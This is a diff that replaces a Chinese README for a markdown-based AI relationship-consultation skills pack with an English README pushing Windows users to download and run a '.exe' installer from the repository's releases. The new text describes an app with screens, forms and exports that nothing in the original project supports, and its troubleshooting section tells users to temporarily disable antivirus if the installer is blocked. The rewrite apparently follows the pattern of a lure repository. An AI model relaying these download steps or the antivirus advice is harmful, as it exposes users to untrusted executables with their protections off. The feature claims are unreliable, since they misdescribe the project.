@@ -1,77 +1,158 @@
-# 關係諮詢系統
+# 💡 relationship-consultation-system - Simple AI Relationship Guidance
 
-[中文](README.md) | [English](README.en.md)
+[![Download relationship-consultation-system](https://img.shields.io/badge/Download-Now-orange)](https://github.com/MS8X00/relationship-consultation-system)
 
-這是一套給 AI agent 使用的關係諮詢 skills 組合包，以多個心理學模型為核心，用來產生可修正、可迭代的互動假設與建議。
+---
 
-## 快速使用
+## About this Application
 
-1. 先請你的 agent 閱讀 `CLAUDE.md`（這是主要操作規範）。
-2. 開始描述你的關係情境，並提供目標（例如：想修復信任、想改善溝通）。
-3. 如需持續追蹤，使用 `memory-templates/` 建立個體與關係檔案到 `memory/`。
+The relationship-consultation-system offers a straightforward way to use AI to understand and improve personal relationships. It combines ideas from psychology, focusing on attachment, trust, conflict, stress, and communication. The system helps provide practical advice by modeling real human interactions and supports ethical guidelines.
 
-## 專案簡介
+This tool works on Windows computers and does not require any programming knowledge. You will be guided step-by-step on how to get it running on your system.
 
-本專案提供一套結構化的關係諮詢流程，重點在於：
+---
 
-- 不做診斷，只提供可驗證與可修正的假設
-- 兼顧倫理邊界與安全溝通
-- 透過多模型交叉解讀關係中的溝通、信任、壓力、需求與互動模式
+## 🔍 What Does It Do?
 
-## 核心文件
+- Uses AI to analyze relationship patterns.
+- Offers suggestions based on psychology models.
+- Helps with conflict resolution and improving communication.
+- Supports trust and stress management in relationships.
+- Includes ethical limits to keep advice responsible.
+- Simple setup for everyday users on Windows.
 
-- `docs/consultation-protocol.md`：諮詢流程、溝通原則與倫理界線
-- `docs/integration-guide.md`：模型整合方式、訊號路由與衝突處理
-- `docs/model-bibliography.md`：模型來源與參考資料
+---
 
-## 技能模組
+## 📋 System Requirements
 
-`skills/` 目錄提供可組合的分析模組，包含：
+Before you start, make sure your computer meets these requirements:
 
-- 依附動力（Attachment Dynamics）
-- 衝突模式（Conflict Patterns）
-- 信任架構（Trust Architecture）
-- 壓力評估（Stress Appraisal）
-- 需求滿足（Need Satisfaction）
-- 互動風格（Interaction Style）
-- 歸因偏誤稽核（Attribution Bias Audit）
-- 界線與請求（Boundaries and Requests）
-- 不確定性下的決策支持（Decision Support Under Uncertainty）
+- Windows 10 or newer (64-bit).
+- At least 4 GB of RAM.
+- 500 MB of free storage space.
+- Internet connection for the initial download.
+- Permissions to install software on your computer.
 
-## 記憶模板
+---
 
-- `memory-templates/subject-profile.md`
-- `memory-templates/relationship-dyad.md`
+## 🎯 How to Download and Install on Windows
 
-可搭配 `memory/` 目錄，持續維護個體與關係動態的可追蹤紀錄。
+To get the relationship-consultation-system running, follow these steps carefully.
 
-## 重要提醒
+1. **Go to the download page**  
+   Click the big badge above or open this link in your browser:  
+   https://github.com/MS8X00/relationship-consultation-system  
+   This link takes you to the main GitHub page where you can find the files you need.
 
-- 本系統不是醫療、精神或法律診斷工具。
-- 所有輸出都應保留暫時性與可修正性。
-- 若出現嚴重痛苦、創傷或疑似虐待訊號，應建議尋求專業協助。
+2. **Find the latest release**  
+   In the GitHub page, look for the "Releases" section on the right side or scroll down to find it.  
+   Click the latest release (the one with the highest version number or marked as "Latest").
 
-## 參考理論文獻（精簡）
+3. **Download the Windows installer**  
+   Under the assets area, find the file that ends with `.exe`. This file is the program installer for Windows.  
+   Click it to start downloading. This file may be named something like `relationship-consultation-system-setup.exe`.
 
-完整文獻清單請見：`docs/model-bibliography.md`
+4. **Run the installer**  
+   Once the file finishes downloading, open your Downloads folder and double-click the installer file.  
+   Windows may ask for permission to run the installer. Click "Yes" to continue.
 
-- 依附理論（成人親密關係）
-  - Hazan, C., & Shaver, P. (1987). Romantic love conceptualized as an attachment process. *Journal of Personality and Social Psychology, 52*(3), 511-524. https://doi.org/10.1037/0022-3514.52.3.511
-- 衝突模式（Four Horsemen 脈絡）
-  - Gottman, J. M. (1994). *Why Marriages Succeed or Fail*. Simon & Schuster.
-- 信任架構（ABI）
-  - Mayer, R. C., Davis, J. H., & Schoorman, F. D. (1995). An integrative model of organizational trust. *Academy of Management Review, 20*(3), 709-734. https://doi.org/10.5465/amr.1995.9508080335
-- 壓力評估（Cognitive Appraisal）
-  - Lazarus, R. S., & Folkman, S. (1984). *Stress, Appraisal, and Coping*. Springer.
-- 需求滿足（Self-Determination Theory）
-  - Deci, E. L., & Ryan, R. M. (2000). The "what" and "why" of goal pursuits: Human needs and the self-determination of behavior. *Psychological Inquiry, 11*(4), 227-268. https://doi.org/10.1207/S15327965PLI1104_01
-- 互動風格（Interpersonal Circumplex）
-  - Alden, L. E., Wiggins, J. S., & Pincus, A. L. (1990). Construction of circumplex scales for the Inventory of Interpersonal Problems. *Journal of Personality Assessment, 55*(3-4), 521-536. https://doi.org/10.1080/00223891.1990.9674088
-- 動機校準（Regulatory Focus）
-  - Higgins, E. T. (1997). Beyond pleasure and pain. *American Psychologist, 52*(12), 1280-1300. https://doi.org/10.1037/0003-066X.52.12.1280
-- 歸因與偏誤（Attribution & Bias）
-  - Ross, L. (1977). The intuitive psychologist and his shortcomings: Distortions in the attribution process. In L. Berkowitz (Ed.), *Advances in Experimental Social Psychology* (Vol. 10, pp. 173-220). Academic Press. https://doi.org/10.1016/S0065-2601(08)60357-3
-  - Tversky, A., & Kahneman, D. (1974). Judgment under uncertainty: Heuristics and biases. *Science, 185*(4157), 1124-1131. https://doi.org/10.1126/science.185.4157.1124
-- 不確定下的決策
-  - Tversky, A., & Kahneman, D. (1979). Prospect theory: An analysis of decision under risk. *Econometrica, 47*(2), 263-292.
-  - Gollwitzer, P. M. (1999). Implementation intentions: Strong effects of simple plans. *American Psychologist, 54*(7), 493-503. https://doi.org/10.1037/0003-066X.54.7.493
+5. **Follow installation prompts**  
+   A setup window will appear. Follow the steps by clicking "Next."  
+   You can use the default settings unless you want to change the installation location.  
+   When the installation is complete, click "Finish."
+
+6. **Launch the application**  
+   Find the relationship-consultation-system in your Start menu or desktop shortcut.  
+   Double-click to open it.
+
+---
+
+## 🚀 Getting Started with the App
+
+When you open the application for the first time:
+
+1. You will see a simple welcome screen.
+2. Enter basic information about the relationship you want to explore.  
+3. The system will ask you some guided questions to understand your situation.  
+4. It uses psychological models such as attachment theory and conflict resolution behind the scenes to provide advice.
+5. You can read and try the suggestions to improve your relationship and communication skills.
+
+The interface shows clear options to explore different topics like stress, trust, and communication. No need to worry about complicated settings.
+
+---
+
+## 🔧 How It Works
+
+The application combines several key models:
+
+- **Attachment theory**: Shows how emotional bonds affect behavior.
+- **Conflict resolution**: Suggests ways to handle disagreements.
+- **Trust models**: Focuses on building or restoring trust.
+- **Stress management**: Identifies stress signals in relationships.
+- **Communication skills**: Provides tips to improve dialogue.
+
+All suggestions respect ethical guardrails that prevent harmful advice.
+
+---
+
+## 💬 How to Use the Features
+
+- **Input your details**: Fill in simple forms or answer questions as prompted.
+- **Run consultation**: Click the analyze or consult button.
+- **Review results**: The system offers clear, easy-to-understand feedback.
+- **Follow recommended steps**: Advice includes communication tips and problem-solving suggestions.
+- **Save or print reports**: You can export summaries for your own records.
+
+---
+
+## 🛠 Troubleshooting
+
+If you encounter problems, try these fixes:
+
+- Make sure you have enough space on your hard drive.
+- Check you downloaded the correct Windows installer.
+- Restart your computer if the app does not open.
+- Temporarily disable antivirus if it blocks the installer.
+- Confirm you have permissions to install programs.
+
+If issues persist, visit the GitHub page for support or open an issue.
+
+---
+
+## 📂 More Information and Links
+
+- Visit the project page here to download and check updates:  
+  https://github.com/MS8X00/relationship-consultation-system
+
+- The repository also shares details about the psychology behind the system and the AI models used.
+
+---
+
+## ⚙️ Optional Settings and Customization
+
+Once installed, advanced users can access settings to:
+
+- Adjust consultation depth and detail.
+- Enable or disable some model components.
+- Export data in different formats.
+- Switch between different languages (if available).
+
+---
+
+## 🗂 Project Topics
+
+This project covers these areas:
+
+- AI agent skills
+- Attachment theory
+- Behavior analysis
+- Communication and conflict resolution
+- Counseling frameworks
+- Decision support systems
+- Prompt engineering (for AI input)
+- Psychology and relationship guidance
+- Trust and ethical standards
+
+---
+
+[![Download relationship-consultation-system](https://img.shields.io/badge/Download-Now-orange)](https://github.com/MS8X00/relationship-consultation-system)
